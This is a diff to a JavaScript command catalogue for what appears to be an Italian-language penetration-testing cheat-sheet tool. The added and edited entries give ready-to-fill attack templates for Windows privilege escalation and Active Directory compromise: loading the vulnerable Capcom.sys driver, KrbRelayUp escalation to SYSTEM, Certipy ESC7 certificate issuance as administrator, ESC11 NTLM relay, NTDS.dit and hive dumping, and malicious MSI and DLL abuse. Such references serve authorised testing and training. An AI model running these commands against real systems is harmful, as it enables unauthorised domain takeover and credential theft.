+  {
+    "id": "seloaddriver",
+    "name": "SeLoadDriver — driver vulnerabile (BYOVD) → SYSTEM",
+    "category": "privesc-windows",
+    "subcategory": "token-priv",
+    "group": "SeLoadDriver",
+    "description": "`SeLoadDriverPrivilege` consente di caricare driver in kernel. Si registra un servizio-driver in una chiave sotto `HKCU` puntando a un driver vulnerabile (BYOVD, es. `Capcom.sys`), lo si carica con `NTLoadDriver` (EoPLoadDriver) e si sfrutta la primitiva kernel del driver per eseguire come SYSTEM.",
+    "note": "# Prerequisiti\nServe SeLoadDriverPrivilege (anche se mostrato Disabled, EoPLoadDriver lo abilita). Il driver deve essere firmato ma vulnerabile (BYOVD).\n# Nota\nÈ lo stesso privilegio sfruttato dal gruppo Print Operators (vedi Privileged Groups).",
+    "platform": "windows",
+    "requires": [
+      "shell"
+    ],
+    "protocols": [],
+    "tags": [
+      "seloaddriver",
+      "byovd",
+      "token"
+    ],
+    "template": "EoPLoadDriver.exe System\\CurrentControlSet\\<svc> C:\\Temp\\capcom.sys",
+    "params": [
+      {
+        "key": "svc",
+        "label": "Chiave servizio",
+        "placeholder": "MyDriver"
+      }
+    ]
+  },
+  {
     "id": "tscon-hijack",
     "name": "tscon — RDP session hijack",
     "category": "privesc-windows",
     "subcategory": "token-priv",
-    "group": "Windows",
+    "group": "RDP hijack (tscon)",
     "description": "Con privilegi SYSTEM si può dirottare la sessione RDP/console di un altro utente (anche admin o di dominio) senza conoscerne la password.",
     "platform": "windows",
     "requires": [
@@ -12842,7 +13618,7 @@ const COMMANDS = [
     "name": "DnsAdmins — DLL, SYSTEM",
     "category": "privesc-windows",
     "subcategory": "priv-groups",
-    "group": "Windows",
+    "group": "DnsAdmins",
     "description": "Membro di `DnsAdmins`: fai caricare al servizio DNS (che gira come SYSTEM) una DLL malevola via UNC, poi riavvia il servizio.",
     "note": "# Prerequisiti\nMembro di DnsAdmins: carichi una DLL malevola nel servizio DNS (dnscmd /config /serverlevelplugindll) che gira come SYSTEM, di norma su un Domain Controller. Serve poter riavviare il servizio DNS.",
     "platform": "windows",
@@ -12889,7 +13665,7 @@ const COMMANDS = [
     "name": "Backup Operators — dump hive & NTDS",
     "category": "privesc-windows",
     "subcategory": "priv-groups",
-    "group": "Windows",
+    "group": "Backup Operators",
     "description": "Il gruppo Backup Operators ha il diritto di backup (SeBackupPrivilege), che permette di leggere qualunque file ignorando le ACL. Si usano reg save per gli hive su un membro o diskshadow per copiare NTDS.dit su un Domain Controller.",
     "note": "# Prossimo passo\nPorta SAM+SYSTEM (o NTDS.dit+SYSTEM) offline e passa a secretsdump per estrarre gli hash.\n# diskshadow su DC\nIl file script contiene: set context persistent nowriters / add volume C: alias z / create / expose %z% x: / e poi copi x:\\Windows\\NTDS\\ntds.dit.\n# Errori comuni\nreg save va eseguito da un processo con il privilegio attivo: con Backup Operators apri una shell e verifica con whoami /priv che SeBackupPrivilege sia presente.",
     "platform": "windows",
@@ -12923,7 +13699,7 @@ const COMMANDS = [
     "name": "Server Operators — abusa servizio",
     "category": "privesc-windows",
     "subcategory": "priv-groups",
-    "group": "Windows",
+    "group": "Server Operators",
     "description": "Il gruppo `Server Operators` può modificare i servizi: il binPath di un servizio, per esempio `AppReadiness`, viene ripuntato sul payload e il servizio riavviato.",
     "note": "# Prerequisiti\nMembro di Server Operators: riconfiguri un servizio di sistema (sc config) perché esegua il tuo binario come SYSTEM, poi sc start. Gruppo privilegiato tipico sui Domain Controller.",
     "platform": "windows",
@@ -12949,7 +13725,7 @@ const COMMANDS = [
     "name": "Print Operators — SeLoadDriver, SYSTEM",
     "category": "privesc-windows",
     "subcategory": "priv-groups",
-    "group": "Windows",
+    "group": "Print Operators",
     "description": "Il gruppo `Print Operators` concede `SeLoadDriverPrivilege`: si carica un driver kernel vulnerabile (Capcom.sys) che disabilita la protezione del kernel e consente l'esecuzione di codice come SYSTEM.",
     "note": "# Come funziona\nSi registra il driver sotto una chiave in HKCU, si abilita il privilegio (EnableSeLoadDriverPrivilege o EoPLoadDriver), poi si sfrutta Capcom.sys con ExploitCapcom. `\\??\\` è un NT Object Path risolto da Windows.\n# Attenzione\nCapcom.sys è firmato ma vulnerabile: con HVCI o la Driver Blocklist di Windows attivi il caricamento fallisce.",
     "platform": "windows",
@@ -12997,7 +13773,7 @@ const COMMANDS = [
     "name": "Event Log Readers — creds nei log",
     "category": "privesc-windows",
     "subcategory": "priv-groups",
-    "group": "Windows",
+    "group": "Event Log Readers",
     "description": "Il gruppo `Event Log Readers` può leggere il Security Event Log, dove a volte restano credenziali in chiaro passate sulla riga di comando (es. `net use /user:...`, `runas`). Si filtrano gli eventi 4688 (creazione processo).",
     "note": "# Cosa cercare\nComandi con `/user` e password in chiaro nelle command line registrate. Gli eventi 4688 richiedono che l'audit della creazione processi sia attivo.\n# Prossimo passo\nOgni credenziale va riprovata su tutti i servizi: è il classico riuso che porta a lateral movement o a un account più privilegiato.",
     "platform": "windows",
@@ -13032,7 +13808,7 @@ const COMMANDS = [
     "name": "Hyper-V Administrators — NTDS da VM",
     "category": "privesc-windows",
     "subcategory": "priv-groups",
-    "group": "Windows",
+    "group": "Hyper-V Administrators",
     "description": "Il gruppo `Hyper-V Administrators` gestisce le macchine virtuali: se il Domain Controller è virtualizzato se ne clona o monta il disco offline e si estrae `NTDS.dit`. In alternativa, su host con servizi di terze parti vulnerabili (es. Mozilla Maintenance Service) si prende possesso del binario del servizio e lo si sostituisce con un payload.",
     "platform": "windows",
     "requires": [
@@ -13307,7 +14083,7 @@ const COMMANDS = [
     "name": "Scheduled Tasks — Windows",
     "category": "privesc-windows",
     "subcategory": "cron-tasks",
-    "group": "Windows",
+    "group": "Scheduled Tasks",
     "description": "Elenca i task pianificati. Quelli che eseguono script o binari scrivibili dall'utente corrente si sovrascrivono con il payload.",
     "note": "# Prossimo passo\nElenca gli scheduled task (schtasks /query /fo LIST /v) e cerca quelli che eseguono un binario o uno script in una cartella scrivibile da te: lo sostituisci e aspetti il trigger.",
     "platform": "windows",
@@ -13327,7 +14103,7 @@ const COMMANDS = [
     "name": "AlwaysInstallElevated",
     "category": "privesc-windows",
     "subcategory": "aie",
-    "group": "Windows",
+    "group": "AlwaysInstallElevated",
     "description": "Se entrambe le chiavi `AlwaysInstallElevated` valgono `0x1`, ogni `.msi` viene installato come SYSTEM: basta generare un MSI malevolo ed eseguirlo.",
     "note": "# Prerequisiti\nFunziona solo se entrambe le chiavi AlwaysInstallElevated (HKLM e HKCU) valgono 1. Costruisci un MSI con msfvenom e lo installi: gira come SYSTEM.",
     "platform": "windows",
@@ -13378,7 +14154,7 @@ const COMMANDS = [
     "name": "Windows — caccia credenziali",
     "category": "privesc-windows",
     "subcategory": "cred-hunting",
-    "group": "Windows",
+    "group": "Caccia credenziali",
     "description": "Cerca credenziali per scalare: autologon, file unattend/sysprep, credenziali salvate, Wi-Fi, sessioni VNC/PuTTY nel registro.",
     "note": "# Prossimo passo\nCerca password in file di config, history PowerShell, registro (AutoLogon, PuTTY, VNC) e credenziali salvate. Ogni credenziale va riprovata su tutti i servizi: il riuso è la via più comune verso SYSTEM o il lateral movement.",
     "platform": "windows",
@@ -13431,7 +14207,7 @@ const COMMANDS = [
     "name": "Kernel exploit — Windows",
     "category": "privesc-windows",
     "subcategory": "kernel",
-    "group": "Windows",
+    "group": "Kernel exploit",
     "description": "Identifica le patch mancanti da `systeminfo`, poi cerca l'exploit. Comuni:\n- MS16-032\n- MS17-010 (EternalBlue)\n- `CVE-2021-36934` (SeriousSAM)\n- PrintNightmare",
     "note": "# Attenzione\nUltima risorsa: punta con Windows Exploit Suggester invece di provare alla cieca. Exploit noti: MS16-032, MS16-135, PrintNightmare, HiveNightmare/SeriousSAM. Rischio di instabilità sul target.",
     "platform": "windows",
@@ -15334,65 +16110,6 @@ const COMMANDS = [
     ]
   },
   {
-    "id": "certipy-find",
-    "name": "Certipy — template vulnerabili",
-    "category": "active-directory",
-    "subcategory": "priv-esc",
-    "group": "ADCS - Recon",
-    "description": "Enumera le Certificate Authority e i template ADCS del dominio, segnalando quelli vulnerabili alle misconfigurazioni note da ESC1 a ESC15. `-vulnerable -stdout` produce un riepilogo rapido a schermo, mentre senza filtri genera un report completo in BloodHound e testo. È il punto di partenza obbligato di ogni attacco ADCS.",
-    "note": "# Prossimo passo\n-vulnerable -stdout elenca i template abusabili (ESC1-ESC15) con la relativa ESC. Da qui scegli l’attacco: ESC1 con certipy-req, ESC8 con il relay web, gli altri con certipy-esc. Recon obbligatoria prima di ogni abuso ADCS.",
-    "platform": "linux",
-    "requires": [
-      "password"
-    ],
-    "protocols": [
-      "ldap",
-      "rpc"
-    ],
-    "tags": [
-      "certipy",
-      "adcs",
-      "esc1"
-    ],
-    "template": "certipy-ad find -u '<user>@<domain>' -p '<password>' -dc-ip <ip> -vulnerable -stdout",
-    "params": [
-      {
-        "key": "user",
-        "label": "User",
-        "ctx": "user",
-        "placeholder": "jdoe"
-      },
-      {
-        "key": "domain",
-        "label": "Domain",
-        "ctx": "domain",
-        "placeholder": "corp.local"
-      },
-      {
-        "key": "password",
-        "label": "Password",
-        "ctx": "password",
-        "placeholder": "P@ssw0rd"
-      },
-      {
-        "key": "ip",
-        "label": "DC IP",
-        "ctx": "ip",
-        "placeholder": "10.10.10.11"
-      }
-    ],
-    "refs": [
-      {
-        "label": "Certipy — GitHub",
-        "url": "https://github.com/ly4k/Certipy"
-      },
-      {
-        "label": "SpecterOps — Certified Pre-Owned (ADCS)",
-        "url": "https://posts.specterops.io/certified-pre-owned-d95910965cd2"
-      }
-    ]
-  },
-  {
     "id": "acl-abuse",
     "name": "ACL abuse — bloodyAD",
     "category": "active-directory",
@@ -16238,6 +16955,43 @@ const COMMANDS = [
     ]
   },
   {
+    "id": "krbrelayup",
+    "name": "KrbRelayUp — local EoP → SYSTEM",
+    "category": "active-directory",
+    "subcategory": "priv-esc",
+    "group": "Kerberos Relay",
+    "description": "Priv esc locale “universale” su macchine joinate a dominio dove il **LDAP signing/channel binding non è imposto**. KrbRelay (James Forshaw) rilancia l’autenticazione Kerberos della macchina locale verso LDAP sul DC; KrbRelayUp concatena il tutto: scrive RBCD sul computer account, poi S4U per un ticket come SYSTEM → shell SYSTEM locale. Nessuna patch: è una misconfig.",
+    "platform": "windows",
+    "requires": [
+      "shell"
+    ],
+    "protocols": [
+      "kerberos",
+      "ldap"
+    ],
+    "tags": [
+      "krbrelay",
+      "krbrelayup",
+      "rbcd",
+      "local-eop"
+    ],
+    "template": "# 1. crea un computer account controllato (MachineAccountQuota>0 di default)\nNew-MachineAccount -MachineAccount ATTACK -Password (ConvertTo-SecureString '<password>' -AsPlainText -Force)\n\n# 2. KrbRelayUp one-shot: relay a LDAP → RBCD → S4U → shell SYSTEM\nKrbRelayUp.exe full -m rbcd -d <domain> -cn ATTACK$ -cp '<password>'",
+    "params": [
+      {
+        "key": "domain",
+        "label": "Domain",
+        "ctx": "domain",
+        "placeholder": "corp.local"
+      },
+      {
+        "key": "password",
+        "label": "Pass computer",
+        "placeholder": "Passw0rd!"
+      }
+    ],
+    "note": "# Prerequisiti\nUn qualunque utente di dominio con shell su una macchina joinata, e LDAP signing/channel-binding NON imposti sul DC. Serve un computer account controllato (MAQ>0 per crearne uno con Powermad/New-MachineAccount).\n# Varianti\n`-m rbcd` (default) oppure `-m shadowcred` (Shadow Credentials sul computer account). La password al punto 2 è quella del computer account creato al punto 1."
+  },
+  {
     "id": "coercer",
     "name": "Coercer — forza autenticazione",
     "category": "active-directory",
@@ -16321,6 +17075,65 @@ const COMMANDS = [
         "label": "DFSCoerce (MS-DFSNM)",
         "template": "python3 dfscoerce.py -u '<user>' -p '<password>' -d '<domain>' <attacker> <ip>",
         "description": "Sfrutta MS-DFSNM (Distributed File System). Frequentemente non patchato è utile quando spooler ed EFSRPC sono chiusi. Richiede credenziali di dominio standard."
+      }
+    ]
+  },
+  {
+    "id": "certipy-find",
+    "name": "Certipy — template vulnerabili",
+    "category": "active-directory",
+    "subcategory": "priv-esc",
+    "group": "ADCS - Recon",
+    "description": "Enumera le Certificate Authority e i template ADCS del dominio, segnalando quelli vulnerabili alle misconfigurazioni note da ESC1 a ESC15. `-vulnerable -stdout` produce un riepilogo rapido a schermo, mentre senza filtri genera un report completo in BloodHound e testo. È il punto di partenza obbligato di ogni attacco ADCS.",
+    "note": "# Prossimo passo\n-vulnerable -stdout elenca i template abusabili (ESC1-ESC15) con la relativa ESC. Da qui scegli l’attacco: ESC1 con certipy-req, ESC8 con il relay web, gli altri con certipy-esc. Recon obbligatoria prima di ogni abuso ADCS.",
+    "platform": "linux",
+    "requires": [
+      "password"
+    ],
+    "protocols": [
+      "ldap",
+      "rpc"
+    ],
+    "tags": [
+      "certipy",
+      "adcs",
+      "esc1"
+    ],
+    "template": "certipy-ad find -u '<user>@<domain>' -p '<password>' -dc-ip <ip> -vulnerable -stdout",
+    "params": [
+      {
+        "key": "user",
+        "label": "User",
+        "ctx": "user",
+        "placeholder": "jdoe"
+      },
+      {
+        "key": "domain",
+        "label": "Domain",
+        "ctx": "domain",
+        "placeholder": "corp.local"
+      },
+      {
+        "key": "password",
+        "label": "Password",
+        "ctx": "password",
+        "placeholder": "P@ssw0rd"
+      },
+      {
+        "key": "ip",
+        "label": "DC IP",
+        "ctx": "ip",
+        "placeholder": "10.10.10.11"
+      }
+    ],
+    "refs": [
+      {
+        "label": "Certipy — GitHub",
+        "url": "https://github.com/ly4k/Certipy"
+      },
+      {
+        "label": "SpecterOps — Certified Pre-Owned (ADCS)",
+        "url": "https://posts.specterops.io/certified-pre-owned-d95910965cd2"
       }
     ]
   },
@@ -16560,6 +17373,66 @@ const COMMANDS = [
     ]
   },
   {
+    "id": "certipy-esc7",
+    "name": "Certipy ESC7 — CA access control",
+    "category": "active-directory",
+    "subcategory": "priv-esc",
+    "group": "ADCS - ESC7",
+    "description": "Diritti `ManageCA` / `ManageCertificates` sulla CA stessa. Con ManageCA ti nomini officer (ManageCertificates); insieme emetti certificati su richieste ad approvazione manuale. Catena Certipy sul template `SubCA`: richiesta che fallisce → l’approvi tu → la recuperi, ottenendo un cert per administrator.",
+    "platform": "linux",
+    "requires": [
+      "password"
+    ],
+    "protocols": [
+      "ldap",
+      "rpc"
+    ],
+    "tags": [
+      "adcs",
+      "esc7",
+      "certipy",
+      "manageca"
+    ],
+    "template": "# 1. concediti ManageCertificates (officer) sulla CA — serve il diritto ManageCA\ncertipy-ad ca -u <user>@<domain> -p '<password>' -dc-ip <ip> -ca <ca> -add-officer <user>\n\n# 2. abilita il template SubCA sulla CA\ncertipy-ad ca -u <user>@<domain> -p '<password>' -dc-ip <ip> -ca <ca> -enable-template SubCA\n\n# 3. richiesta su SubCA: fallisce ma salva la chiave privata e dà un request ID\ncertipy-ad req -u <user>@<domain> -p '<password>' -dc-ip <ip> -ca <ca> -template SubCA -upn administrator@<domain>\n\n# 4. approva la richiesta (come officer) e recupera il certificato\ncertipy-ad ca -u <user>@<domain> -p '<password>' -dc-ip <ip> -ca <ca> -issue-request <reqid>\ncertipy-ad req -u <user>@<domain> -p '<password>' -dc-ip <ip> -ca <ca> -retrieve <reqid>",
+    "params": [
+      {
+        "key": "user",
+        "label": "User",
+        "ctx": "user",
+        "placeholder": "jdoe"
+      },
+      {
+        "key": "password",
+        "label": "Password",
+        "ctx": "password",
+        "placeholder": "P@ssw0rd"
+      },
+      {
+        "key": "domain",
+        "label": "Domain",
+        "ctx": "domain",
+        "placeholder": "corp.local"
+      },
+      {
+        "key": "ip",
+        "label": "DC IP",
+        "ctx": "ip",
+        "placeholder": "10.10.10.10"
+      },
+      {
+        "key": "ca",
+        "label": "CA",
+        "placeholder": "corp-DC-CA"
+      },
+      {
+        "key": "reqid",
+        "label": "Request ID",
+        "placeholder": "785"
+      }
+    ],
+    "note": "# Interpretazione\nControllare la CA ≠ controllare un template: con ManageCA+ManageCertificates emetti ciò che vuoi approvando le richieste manuali. SubCA è il template comodo perché richiede approvazione.\n# Alternativa (ESC6)\nCol solo ManageCA puoi abilitare il flag EDITF_ATTRIBUTESUBJECTALTNAME2, riattivando ESC6 su qualunque template.\n# Prossimo passo\n`certipy-ad auth -pfx administrator.pfx -dc-ip <ip>` per il TGT."
+  },
+  {
     "id": "ntlmrelayx-adcs",
     "name": "ntlmrelayx — relay ADCS Web (ESC8)",
     "category": "active-directory",
@@ -16658,6 +17531,43 @@ const COMMANDS = [
         "placeholder": "ESC9Template"
       }
     ]
+  },
+  {
+    "id": "certipy-esc11",
+    "name": "Certipy ESC11 — relay a RPC (ICPR)",
+    "category": "active-directory",
+    "subcategory": "priv-esc",
+    "group": "ADCS - ESC11",
+    "description": "Come ESC8 ma il relay va verso l’interfaccia **RPC** di enrollment della CA (ICertPassage / ICPR) invece della web enrollment HTTP. Vale quando il flag `IF_ENFORCEENCRYPTICERTREQUEST` non è imposto (Certipy lo segnala come ESC11). Si combina con una coercizione del DC.",
+    "platform": "linux",
+    "requires": [
+      "no-creds"
+    ],
+    "protocols": [
+      "rpc",
+      "ntlm"
+    ],
+    "tags": [
+      "adcs",
+      "esc11",
+      "ntlmrelayx",
+      "icpr"
+    ],
+    "template": "# relay verso l'endpoint RPC di enrollment (ICPR); abbinalo a una coercizione del DC (Coercer)\nimpacket-ntlmrelayx -t rpc://<ip> -rpc-mode ICPR -icpr-ca-name <ca> -smb2support",
+    "params": [
+      {
+        "key": "ip",
+        "label": "CA IP",
+        "ctx": "ip",
+        "placeholder": "10.10.10.10"
+      },
+      {
+        "key": "ca",
+        "label": "CA",
+        "placeholder": "corp-DC-CA"
+      }
+    ],
+    "note": "# Prerequisiti\nFlag IF_ENFORCEENCRYPTICERTREQUEST non imposto. Supporto ESC11 in impacket recente (o fork Sploutchy). Come ESC8 serve una coercizione del DC in parallelo (vedi Coercion).\n# Risultato\nCertificato del computer account relayato → TGT con `certipy-ad auth`."
   },
   {
     "id": "certipy-esc13",
